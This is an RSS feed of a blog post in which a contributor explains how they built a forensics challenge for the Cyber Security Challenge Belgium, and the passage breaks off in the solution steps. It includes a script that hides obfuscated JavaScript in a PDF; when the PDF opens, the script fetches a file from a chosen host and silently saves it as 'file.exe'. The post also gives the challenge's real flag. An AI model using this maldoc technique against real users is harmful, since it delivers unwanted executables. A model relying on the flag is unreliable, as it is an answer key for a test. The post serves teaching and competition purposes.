@@ -1,0 +1,368 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/">
+  <channel>
+    <title>Blog on Tokumei&#39;s Blog</title>
+    <link>https://blog.tokumei.lu/blog/</link>
+    <description>Recent content in Blog on Tokumei&#39;s Blog</description>
+    <generator>Hugo -- gohugo.io</generator>
+    <language>en-US</language>
+    <managingEditor>webapp@tokumei.lu (Tokumei)</managingEditor>
+    <webMaster>webapp@tokumei.lu (Tokumei)</webMaster>
+    <copyright>Tokumei.lu (CC BY 4.0)</copyright>
+    <lastBuildDate>Tue, 01 Oct 2024 00:00:00 +0000</lastBuildDate>
+    <atom:link href="https://blog.tokumei.lu/blog/index.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title>Unraveling &#39;Jeroen&#39;s Secret Bamboo Stew&#39; at CSCBE: A Thrilling Challenge Experience as a Contributor</title>
+      <link>https://blog.tokumei.lu/blog/cscbe2024/</link>
+      <pubDate>Tue, 01 Oct 2024 00:00:00 +0000</pubDate><author>webapp@tokumei.lu (Tokumei)</author>
+      <guid>https://blog.tokumei.lu/blog/cscbe2024/</guid>
+      <description>As a cybersecurity enthusiast, contributing to the Cyber Security Challenge Belgium (CSCBE) this year was an incredible experience. Participating as a challenge contributor in the CSCBE this year was an exhilarating experience. Designing a challenge that tests the skills and ingenuity of participants is both a responsibility and a joy. One of the challenges I created was &amp;lsquo;Jeroen&amp;rsquo;s Secret Bamboo Stew.&amp;rsquo; In this blog, I’ll delve into the intricacies of this challenge, share the scripts I developed, and reflect on the excitement of contributing to such a dynamic competition.</description>
+      <content:encoded><![CDATA[<p>As a cybersecurity enthusiast, contributing to the Cyber Security Challenge Belgium (CSCBE) this year was an incredible experience. Participating as a challenge contributor in the CSCBE this year was an exhilarating experience. Designing a challenge that tests the skills and ingenuity of participants is both a responsibility and a joy. One of the challenges I created was &lsquo;Jeroen&rsquo;s Secret Bamboo Stew.&rsquo; In this blog, I’ll delve into the intricacies of this challenge, share the scripts I developed, and reflect on the excitement of contributing to such a dynamic competition.</p>
+<h2 id="whois-cyber-security-challenge-belgium">Whois: Cyber Security Challenge Belgium</h2>
+<p>The Cyber Security Challenge Belgium (CSCBE) is an annual competition specifically tailored for students passionate about cybersecurity. This engaging event invites participants from various educational backgrounds to tackle a series of exciting challenges that test their skills in areas such as forensics, cryptography, and web exploitation. One of the unique aspects of CSCBE is its emphasis on networking opportunities; students have the chance to connect with industry sponsors and professionals, fostering valuable relationships that can help guide their future careers. By providing a platform for students to apply their theoretical knowledge to practical problems, CSCBE enhances technical abilities while promoting critical thinking and problem-solving in the face of real-world security challenges. Ultimately, it prepares students for future careers in cybersecurity while cultivating a vibrant community of aspiring professionals.</p>
+<h2 id="tldr-the-challenge">TLDR: The Challenge</h2>
+<h3 id="category">Category</h3>
+<blockquote>
+<p>Forensics | Programming | Steganography</p>
+</blockquote>
+<h3 id="category---estimated-difficulty">Category - Estimated Difficulty</h3>
+<blockquote>
+<p>Easy/Medium</p>
+</blockquote>
+<h3 id="category---description">Category - Description</h3>
+<blockquote>
+<p>The goal of the challenge was for students to identify JavaScript code hidden inside a PDF, extract links from the code, and download files from those links. One of the files contained the hidden flag. While it sounds straightforward, the challenge required attention to detail and some clever problem-solving.</p>
+</blockquote>
+<h3 id="scenario---desription">Scenario - Desription</h3>
+<blockquote>
+<p>Jeroen, a skilled chef, has developed a secret recipe for a new type of bamboo stew. To protect his recipe, he hid it in a file. While Jeroen was napping, Toku stole his laptop and opened a file he found intriguing. But just as Toku was about to unlock the secret, he fell asleep, leaving the task to CSCBE participants: Can you discover Jeroen’s secret ingredient before Toku wakes up?</p>
+</blockquote>
+<h2 id="crafting-the-challenge-the-technical-side">Crafting the Challenge: The Technical Side</h2>
+<h3 id="step-1-generating-the-pdf-with-hidden-javascript">Step 1: Generating the PDF with Hidden JavaScript</h3>
+<p>To start the challenge, I needed to create a PDF containing JavaScript code that participants would have to extract. The script I developed automates this process by embedding JavaScript into a PDF document. I was heavily inspired when creating challenge by Didier Stevens work. Didier is an expert in malicious documents and reverse engineering. His in-depth analysis and tools have significantly contributed to the cybersecurity community, especially in the detection and dissection of malicious payloads hidden in Office files and PDFs. You can explore his research, tools, and insights at <a href="https://blog.didierstevens.com">https://blog.didierstevens.com</a>.</p>
+<p>Here&rsquo;s the Python script I used to create the challenge&rsquo;s PDF:</p>
+
+
+
+
+
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="kn">import</span> <span class="nn">sys</span>
+</span></span><span class="line"><span class="ln"> 2</span><span class="cl"><span class="kn">from</span> <span class="nn">PyPDF2</span> <span class="kn">import</span> <span class="n">PdfReader</span><span class="p">,</span> <span class="n">PdfWriter</span>
+</span></span><span class="line"><span class="ln"> 3</span><span class="cl">
+</span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="c1"># Check that the correct number of arguments were passed</span>
+</span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">3</span><span class="p">:</span>
+</span></span><span class="line"><span class="ln"> 6</span><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;Usage: python generate_chal.py &lt;domain.com&gt; &lt;amount_of_files&gt;&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="ln"> 7</span><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;Example: python generate_chal.py 127.0.0.1 1000&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="ln"> 8</span><span class="cl">    <span class="n">sys</span><span class="o">.</span><span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+</span></span><span class="line"><span class="ln"> 9</span><span class="cl">
+</span></span><span class="line"><span class="ln">10</span><span class="cl"><span class="c1"># Get the values of the arguments</span>
+</span></span><span class="line"><span class="ln">11</span><span class="cl"><span class="n">URL</span> <span class="o">=</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>
+</span></span><span class="line"><span class="ln">12</span><span class="cl"><span class="n">amount</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">])</span>
+</span></span><span class="line"><span class="ln">13</span><span class="cl">
+</span></span><span class="line"><span class="ln">14</span><span class="cl"><span class="c1"># Create the JavaScript code for downloading and executing a file</span>
+</span></span><span class="line"><span class="ln">15</span><span class="cl"><span class="n">js_list</span> <span class="o">=</span> <span class="p">[]</span>
+</span></span><span class="line"><span class="ln">16</span><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="s2">&#34;Created &#34;</span> <span class="o">+</span><span class="nb">str</span><span class="p">(</span><span class="n">amount</span><span class="p">)</span><span class="o">+</span> <span class="s2">&#34; javascript files&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="ln">17</span><span class="cl"><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">amount</span><span class="p">):</span>
+</span></span><span class="line"><span class="ln">18</span><span class="cl">    <span class="n">start_js</span> <span class="o">=</span> <span class="s2">&#34;/Names [(EmbeddedJS) &lt;&lt; /S /JavaScript /JS (&#34;</span>   
+</span></span><span class="line"><span class="ln">19</span><span class="cl">    <span class="n">mal_js</span> <span class="o">=</span> <span class="s2">&#34;var P=Q;(function(V,x){var F=Q,W=V();while(!![]){try{var K=-parseInt(F(0xb2))/0x1*(parseInt(F(0xb8))/0x2)+parseInt(F(0xba))/0x3*(-parseInt(F(0xaf))/0x4)+parseInt(F(0xbf))/0x5*(-parseInt(F(0xc5))/0x6)+-parseInt(F(0xbc))/0x7*(parseInt(F(0xc0))/0x8)+-parseInt(F(0xbb))/0x9*(-parseInt(F(0xb4))/0xa)+-parseInt(F(0xc6))/0xb+-parseInt(F(0xb3))/0xc*(-parseInt(F(0xc9))/0xd);if(K===x)break;else W[&#39;push&#39;](W[&#39;shift&#39;]());}catch(Z){W[&#39;push&#39;](W[&#39;shift&#39;]());}}}(C,0xe97f1));var fileUrl=P(0xb1),xhr=new XMLHttpRequest();function Q(V,x){var W=C();return Q=function(K,Z){K=K-0xaf;var F=W[K];return F;},Q(V,x);}xhr[P(0xcb)](&#39;GET&#39;,fileUrl,!![]),xhr[P(0xc4)]=P(0xca),xhr[&#39;onload&#39;]=function(){var q=P,V=new File([xhr[q(0xc7)]],q(0xb7),{&#39;type&#39;:q(0xc2)}),x=URL[q(0xb5)](V),W=document[q(0xb6)](&#39;a&#39;);W[q(0xcc)]=q(0xc8),W[q(0xbd)]=x,W[q(0xbe)]=V[&#39;name&#39;],document[q(0xb0)][q(0xb9)](W),W[q(0xc3)](),setTimeout(function(){var h=q;URL[h(0xcd)](x);},0x64);},xhr[P(0xc1)]();function C(){var z=[&#39;file.exe&#39;,&#39;5468zxIgZX&#39;,&#39;appendChild&#39;,&#39;3874926ZWJkQH&#39;,&#39;171kONjLd&#39;,&#39;9031309HXGsVe&#39;,&#39;href&#39;,&#39;download&#39;,&#39;70ftvfat&#39;,&#39;8watwfh&#39;,&#39;send&#39;,&#39;application/octet-stream&#39;,&#39;click&#39;,&#39;responseType&#39;,&#39;467658fnjDJz&#39;,&#39;4430360eNIcRH&#39;,&#39;response&#39;,&#39;display:</span><span class="se">\x20</span><span class="s2">none&#39;,&#39;63857729zwwgjy&#39;,&#39;arraybuffer&#39;,&#39;open&#39;,&#39;style&#39;,&#39;revokeObjectURL&#39;,&#39;4biJxER&#39;,&#39;body&#39;,&#39;http://&#34;</span><span class="o">+</span><span class="n">URL</span><span class="o">+</span><span class="s2">&#34;/file&#34;</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">i</span><span class="p">)</span> <span class="o">+</span> <span class="s2">&#34;.txt&#39;,&#39;493lXWYDo&#39;,&#39;12LlAsrv&#39;,&#39;772590TVEvZu&#39;,&#39;createObjectURL&#39;,&#39;createElement&#39;];C=function(){return z;};return C();}&#34;</span>
+</span></span><span class="line"><span class="ln">20</span><span class="cl">    <span class="n">end_js</span> <span class="o">=</span> <span class="s2">&#34;) &gt;&gt;]</span><span class="se">\n</span><span class="s2">&#34;</span>
+</span></span><span class="line"><span class="ln">21</span><span class="cl">    <span class="n">javascript</span> <span class="o">=</span> <span class="n">start_js</span> <span class="o">+</span> <span class="n">mal_js</span> <span class="o">+</span> <span class="n">end_js</span>
+</span></span><span class="line"><span class="ln">22</span><span class="cl">    <span class="n">js_list</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">javascript</span><span class="p">)</span>
+</span></span><span class="line"><span class="ln">23</span><span class="cl">
+</span></span><span class="line"><span class="ln">24</span><span class="cl"><span class="c1"># Open the PDF file in read mode</span>
+</span></span><span class="line"><span class="ln">25</span><span class="cl"><span class="n">pdf_file</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="s1">&#39;input.pdf&#39;</span><span class="p">,</span> <span class="s1">&#39;rb&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="ln">26</span><span class="cl">
+</span></span><span class="line"><span class="ln">27</span><span class="cl"><span class="c1"># Create a PdfReader object</span>
+</span></span><span class="line"><span class="ln">28</span><span class="cl"><span class="n">pdf_reader</span> <span class="o">=</span> <span class="n">PdfReader</span><span class="p">(</span><span class="n">pdf_file</span><span class="p">)</span>
+</span></span><span class="line"><span class="ln">29</span><span class="cl">
+</span></span><span class="line"><span class="ln">30</span><span class="cl"><span class="c1"># Create a PdfWriter object</span>
+</span></span><span class="line"><span class="ln">31</span><span class="cl"><span class="n">pdf_writer</span> <span class="o">=</span> <span class="n">PdfWriter</span><span class="p">()</span>
+</span></span><span class="line"><span class="ln">32</span><span class="cl">
+</span></span><span class="line"><span class="ln">33</span><span class="cl"><span class="c1"># Add the PDF pages to the writer object</span>
+</span></span><span class="line"><span class="ln">34</span><span class="cl"><span class="k">for</span> <span class="n">page</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="nb">len</span><span class="p">(</span><span class="n">pdf_reader</span><span class="o">.</span><span class="n">pages</span><span class="p">)):</span>
+</span></span><span class="line"><span class="ln">35</span><span class="cl">    <span class="n">pdf_writer</span><span class="o">.</span><span class="n">add_page</span><span class="p">(</span><span class="n">pdf_reader</span><span class="o">.</span><span class="n">pages</span><span class="p">[</span><span class="n">page</span><span class="p">])</span>
+</span></span><span class="line"><span class="ln">36</span><span class="cl">
+</span></span><span class="line"><span class="ln">37</span><span class="cl"><span class="c1"># Add the JavaScript code to the PDF file</span>
+</span></span><span class="line"><span class="ln">38</span><span class="cl"><span class="k">for</span> <span class="n">js</span> <span class="ow">in</span> <span class="n">js_list</span><span class="p">:</span>   
+</span></span><span class="line"><span class="ln">39</span><span class="cl">    <span class="n">pdf_writer</span><span class="o">.</span><span class="n">add_js</span><span class="p">(</span><span class="n">js</span><span class="p">)</span>
+</span></span><span class="line"><span class="ln">40</span><span class="cl">
+</span></span><span class="line"><span class="ln">41</span><span class="cl"><span class="c1"># Create a new PDF file in write mode</span>
+</span></span><span class="line"><span class="ln">42</span><span class="cl"><span class="n">output_file</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="s1">&#39;Jeroen_Stew.pdf&#39;</span><span class="p">,</span> <span class="s1">&#39;wb&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="ln">43</span><span class="cl">
+</span></span><span class="line"><span class="ln">44</span><span class="cl"><span class="c1"># Write the PDF to the output file</span>
+</span></span><span class="line"><span class="ln">45</span><span class="cl"><span class="n">pdf_writer</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">output_file</span><span class="p">)</span>
+</span></span><span class="line"><span class="ln">46</span><span class="cl">
+</span></span><span class="line"><span class="ln">47</span><span class="cl"><span class="c1"># Close the input and output files</span>
+</span></span><span class="line"><span class="ln">48</span><span class="cl"><span class="n">pdf_file</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
+</span></span><span class="line"><span class="ln">49</span><span class="cl"><span class="n">output_file</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
+</span></span><span class="line"><span class="ln">50</span><span class="cl">
+</span></span><span class="line"><span class="ln">51</span><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="s2">&#34;[*] Created PDF : Jeroen_Stew.pdf&#34;</span><span class="p">)</span></span></span></code></pre></div>
+
+
+
+
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="ln">1</span><span class="cl">PyPDF2==3.0.1</span></span></code></pre></div><p>The script takes a domain (to embed into the hidden JavaScript) and the number of files to generate. It automates the process of embedding JavaScript into the PDF, creating a hidden layer of complexity for the challenge.</p>
+<p>The PDF at the end looked like the following:
+<img alt="Jeroen_Stew_PDF" src="../../images/cscbe2024/Jeroen_Stew_PDF.png"></p>
+<h3 id="step-2-creating-the-web-server-to-host-the-files">Step 2: Creating the Web Server to Host the Files</h3>
+<p>Once the participants extracted the JavaScript from the PDF, they were led to a web server hosting several files, one of which contained the flag. The next step was to set up this web server.</p>
+<p>I used Docker to create a simple NGINX web server:</p>
+
+
+
+
+
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-yaml" data-lang="yaml"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="ln"> 2</span><span class="cl"><span class="w"></span><span class="nt">version</span><span class="p">:</span><span class="w"> </span><span class="s1">&#39;3&#39;</span><span class="w">
+</span></span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="w"></span><span class="nt">services</span><span class="p">:</span><span class="w">
+</span></span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="w">  </span><span class="nt">web</span><span class="p">:</span><span class="w">
+</span></span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="w">    </span><span class="nt">image</span><span class="p">:</span><span class="w"> </span><span class="l">nginx</span><span class="w">
+</span></span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="w">    </span><span class="nt">ports</span><span class="p">:</span><span class="w">
+</span></span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="w">      </span>- <span class="s2">&#34;80:80&#34;</span><span class="w">
+</span></span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="w">    </span><span class="nt">volumes</span><span class="p">:</span><span class="w">
+</span></span></span><span class="line"><span class="ln">10</span><span class="cl"><span class="w">      </span>- <span class="l">./html:/usr/share/nginx/html</span></span></span></code></pre></div><h3 id="step-3-the-fun-with-hidden-files">Step 3: The Fun with Hidden Files</h3>
+<p>To make the challenge more engaging, I created thousands of random files on the web server. Only one file contained the flag. Participants had to search through these files to find the right one. What made it more fun is that the X files mentioned in the PDF may be different in the amount as the amount hosted. Here’s the script I wrote to generate the files and hide the flag:</p>
+
+
+
+
+
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="ln"> 1</span><span class="cl">
+</span></span><span class="line"><span class="ln"> 2</span><span class="cl"><span class="kn">import</span> <span class="nn">os</span>
+</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="kn">import</span> <span class="nn">random</span>
+</span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="kn">import</span> <span class="nn">string</span>
+</span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="kn">import</span> <span class="nn">sys</span>
+</span></span><span class="line"><span class="ln"> 6</span><span class="cl">
+</span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="c1"># Check that the correct number of arguments were passed</span>
+</span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">4</span><span class="p">:</span>
+</span></span><span class="line"><span class="ln"> 9</span><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;Usage: python generate_chal.py &lt;flag&gt; &lt;amount&gt; &lt;num_file_to_hide_flag&gt;&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="ln">10</span><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;Example: python generate_files.py &#39;Here the real flag: CSC</span><span class="si">{th3_53cr3t_15_5ug3rcan3}</span><span class="s2">&#39; 1000 555&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="ln">11</span><span class="cl">    <span class="n">sys</span><span class="o">.</span><span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+</span></span><span class="line"><span class="ln">12</span><span class="cl">
+</span></span><span class="line"><span class="ln">13</span><span class="cl"><span class="c1"># Get the values of the arguments</span>
+</span></span><span class="line"><span class="ln">14</span><span class="cl"><span class="n">flag</span> <span class="o">=</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>
+</span></span><span class="line"><span class="ln">15</span><span class="cl"><span class="n">num_files</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">])</span>
+</span></span><span class="line"><span class="ln">16</span><span class="cl">
+</span></span><span class="line"><span class="ln">17</span><span class="cl"><span class="c1"># Set the name of the hidden file</span>
+</span></span><span class="line"><span class="ln">18</span><span class="cl"><span class="n">hidden_file_name</span> <span class="o">=</span> <span class="sa">f</span><span class="s2">&#34;file</span><span class="si">{</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">3</span><span class="p">]</span><span class="si">}</span><span class="s2">.txt&#34;</span>
+</span></span><span class="line"><span class="ln">19</span><span class="cl">
+</span></span><span class="line"><span class="ln">20</span><span class="cl"><span class="c1"># Set the directory to create the files in</span>
+</span></span><span class="line"><span class="ln">21</span><span class="cl"><span class="n">directory</span> <span class="o">=</span> <span class="s2">&#34;./html&#34;</span>
+</span></span><span class="line"><span class="ln">22</span><span class="cl">
+</span></span><span class="line"><span class="ln">23</span><span class="cl"><span class="c1"># Create the directory if it doesn&#39;t exist</span>
+</span></span><span class="line"><span class="ln">24</span><span class="cl"><span class="k">if</span> <span class="ow">not</span> <span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">exists</span><span class="p">(</span><span class="n">directory</span><span class="p">):</span>
+</span></span><span class="line"><span class="ln">25</span><span class="cl">    <span class="n">os</span><span class="o">.</span><span class="n">makedirs</span><span class="p">(</span><span class="n">directory</span><span class="p">)</span>
+</span></span><span class="line"><span class="ln">26</span><span class="cl">
+</span></span><span class="line"><span class="ln">27</span><span class="cl"><span class="c1"># Create the random files</span>
+</span></span><span class="line"><span class="ln">28</span><span class="cl"><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">num_files</span><span class="p">):</span>
+</span></span><span class="line"><span class="ln">29</span><span class="cl">    <span class="n">file_name</span> <span class="o">=</span> <span class="sa">f</span><span class="s2">&#34;file</span><span class="si">{</span><span class="n">i</span><span class="si">}</span><span class="s2">.txt&#34;</span>
+</span></span><span class="line"><span class="ln">30</span><span class="cl">    <span class="n">file_path</span> <span class="o">=</span> <span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">directory</span><span class="p">,</span> <span class="n">file_name</span><span class="p">)</span>
+</span></span><span class="line"><span class="ln">31</span><span class="cl">    <span class="n">file_content</span> <span class="o">=</span> <span class="s2">&#34;&#34;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">random</span><span class="o">.</span><span class="n">choices</span><span class="p">(</span><span class="n">string</span><span class="o">.</span><span class="n">ascii_lowercase</span><span class="p">,</span> <span class="n">k</span><span class="o">=</span><span class="mi">100</span><span class="p">))</span>
+</span></span><span class="line"><span class="ln">32</span><span class="cl">
+</span></span><span class="line"><span class="ln">33</span><span class="cl">    <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="n">file_path</span><span class="p">,</span> <span class="s2">&#34;w&#34;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
+</span></span><span class="line"><span class="ln">34</span><span class="cl">        <span class="n">f</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">file_content</span><span class="p">)</span>
+</span></span><span class="line"><span class="ln">35</span><span class="cl">
+</span></span><span class="line"><span class="ln">36</span><span class="cl">    <span class="k">if</span> <span class="n">file_name</span> <span class="o">==</span> <span class="n">hidden_file_name</span><span class="p">:</span>
+</span></span><span class="line"><span class="ln">37</span><span class="cl">        <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="n">file_path</span><span class="p">,</span> <span class="s2">&#34;w&#34;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
+</span></span><span class="line"><span class="ln">38</span><span class="cl">            <span class="n">f</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="s2">&#34;</span><span class="se">\n</span><span class="s2">&#34;</span> <span class="o">+</span> <span class="n">flag</span><span class="p">)</span>
+</span></span><span class="line"><span class="ln">39</span><span class="cl">
+</span></span><span class="line"><span class="ln">40</span><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="s2">&#34;Finished generating files!&#34;</span><span class="p">)</span></span></span></code></pre></div><p>In this case to keep it simple for the students, the script generated 1,000 random files, with the flag hidden in one of them. The participants needed to download all the files and search for the correct one, or at least browse and parse them. This was the programmatic part where students could easily browse to these parse these in an automated way.</p>
+<h3 id="step-4-adding-some-red-herrings">Step 4: Adding Some Red Herrings</h3>
+<p>To add to the challenge, I created a robots.txt file to mislead participants. The file contained some fake hidden pages and incorrect hints:</p>
+
+
+
+
+
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="ln"> 1</span><span class="cl">
+</span></span><span class="line"><span class="ln"> 2</span><span class="cl">User-agent: *
+</span></span><span class="line"><span class="ln"> 3</span><span class="cl">Disallow:
+</span></span><span class="line"><span class="ln"> 4</span><span class="cl">
+</span></span><span class="line"><span class="ln"> 5</span><span class="cl">Sitemap: https://www.example.com/sitemap.xml
+</span></span><span class="line"><span class="ln"> 6</span><span class="cl">
+</span></span><span class="line"><span class="ln"> 7</span><span class="cl"># Disallow access to sensitive directories
+</span></span><span class="line"><span class="ln"> 8</span><span class="cl">Disallow: /admin/
+</span></span><span class="line"><span class="ln"> 9</span><span class="cl">Disallow: /private/
+</span></span><span class="line"><span class="ln">10</span><span class="cl">
+</span></span><span class="line"><span class="ln">11</span><span class="cl"># Hidden pages
+</span></span><span class="line"><span class="ln">12</span><span class="cl">Disallow: /panda-info/
+</span></span><span class="line"><span class="ln">13</span><span class="cl">Disallow: /panda-pictures/
+</span></span><span class="line"><span class="ln">14</span><span class="cl">Disallow: /adopt-a-panda/
+</span></span><span class="line"><span class="ln">15</span><span class="cl">
+</span></span><span class="line"><span class="ln">16</span><span class="cl">Congratulation here is the flag: CSC{have_you_seen_the_recipe?} &lt;- not the flag ;)</span></span></code></pre></div><p>Participants might have thought they found the flag, only to realize it was a decoy! So obvious, so cheeky I know..</p>
+<h3 id="step-5-the-fake-flag-in-indexhtml">Step 5: The Fake Flag in index.html</h3>
+<p>To cringe even more, I also added a playful fake flag to the index.html page:</p>
+
+
+
+
+
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="ln"> 1</span><span class="cl">
+</span></span><span class="line"><span class="ln"> 2</span><span class="cl"><span class="cp">&lt;!DOCTYPE html&gt;</span>
+</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="p">&lt;</span><span class="nt">html</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="ln"> 4</span><span class="cl">  <span class="p">&lt;</span><span class="nt">head</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="ln"> 5</span><span class="cl">    <span class="p">&lt;</span><span class="nt">title</span><span class="p">&gt;</span>Pandas!<span class="p">&lt;/</span><span class="nt">title</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="ln"> 6</span><span class="cl">  <span class="p">&lt;/</span><span class="nt">head</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="ln"> 7</span><span class="cl">  <span class="p">&lt;</span><span class="nt">body</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="ln"> 8</span><span class="cl">    <span class="p">&lt;</span><span class="nt">h1</span><span class="p">&gt;</span>Welcome to my hidden Panda Page!<span class="p">&lt;/</span><span class="nt">h1</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="ln"> 9</span><span class="cl">    <span class="p">&lt;</span><span class="nt">p</span><span class="p">&gt;</span>Here are some pictures of pandas:<span class="p">&lt;/</span><span class="nt">p</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="ln">10</span><span class="cl">    <span class="p">&lt;</span><span class="nt">img</span> <span class="na">src</span><span class="o">=</span><span class="s">&#34;https://upload.wikimedia.org/wikipedia/commons/thumb/0/0f/Grosser_Panda.JPG/1200px-Grosser_Panda.JPG&#34;</span> <span class="na">alt</span><span class="o">=</span><span class="s">&#34;Giant Panda&#34;</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="ln">11</span><span class="cl">    <span class="p">&lt;</span><span class="nt">img</span> <span class="na">src</span><span class="o">=</span><span class="s">&#34;https://upload.wikimedia.org/wikipedia/commons/thumb/1/1b/Baby_Pandas.JPG/1280px-Baby_Pandas.JPG&#34;</span> <span class="na">alt</span><span class="o">=</span><span class="s">&#34;Panda cub&#34;</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="ln">12</span><span class="cl">    <span class="p">&lt;</span><span class="nt">p</span><span class="p">&gt;</span>Pandas are native to central China and are known for their distinctive black and white fur. They are herbivores and primarily eat bamboo. Pandas are an endangered species, with only around 1,800 in the wild.<span class="p">&lt;/</span><span class="nt">p</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="ln">13</span><span class="cl">
+</span></span><span class="line"><span class="ln">14</span><span class="cl">    Congratulation here is the fake flag: flag{this_is_not_the_flag}
+</span></span><span class="line"><span class="ln">15</span><span class="cl">
+</span></span><span class="line"><span class="ln">16</span><span class="cl">    You might have been lost, so here is a <span class="p">&lt;</span><span class="nt">a</span> <span class="na">href</span><span class="o">=</span><span class="s">&#34;https://www.youtube.com/watch?v=X21mJh6j9i4&#34;</span><span class="p">&gt;</span>hint<span class="p">&lt;/</span><span class="nt">a</span><span class="p">&gt;</span> for you.
+</span></span><span class="line"><span class="ln">17</span><span class="cl">  <span class="p">&lt;/</span><span class="nt">body</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="ln">18</span><span class="cl"><span class="p">&lt;/</span><span class="nt">html</span><span class="p">&gt;</span></span></span></code></pre></div><p>This page contained a fake flag and a misleading hint to throw participants off the trail! Of course the link to the video contained a real hint. Come on, I am not that bad.</p>
+<h2 id="the-write-up">The Write-up</h2>
+<p>Participants could have approached the challenge by following a systematic process to uncover the hidden flag.</p>
+<p>Here&rsquo;s a step-by-step breakdown of the solution:</p>
+<ol>
+<li>
+<p>Extracting Links from the PDF:</p>
+<ul>
+<li>Objective: Identify all URLs embedded within the hidden JavaScript code in the PDF.</li>
+<li>Method:
+<ul>
